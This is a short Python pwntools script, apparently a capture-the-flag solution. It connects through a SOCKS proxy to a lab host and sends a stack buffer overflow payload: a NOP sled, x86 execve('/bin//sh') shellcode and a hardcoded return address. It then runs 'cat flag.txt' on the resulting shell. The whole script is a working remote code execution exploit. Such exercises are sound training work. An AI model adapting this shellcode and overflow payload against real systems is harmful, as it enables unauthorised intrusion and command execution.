from pwn import *  # Import lib to use the APIs, just like any Python lib
# Suppress non-error messages, i.e. less verbose runtime output
context.log_level = 'error'
context.proxy = (socks.SOCKS5, 'localhost', 8123)

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
conn = remote('192.168.2.83', 28373)
# get rid of welcome messages
for i in range(4):
    conn.readline()
conn.sendline(132 * b"\x90" + shellcode + b"\xb0\xd4\x3f\xfc" + 10000 * b"\x90" + shellcode)
conn.readline()
conn.sendline("cat flag.txt")
response = conn.recvall()
print(response)
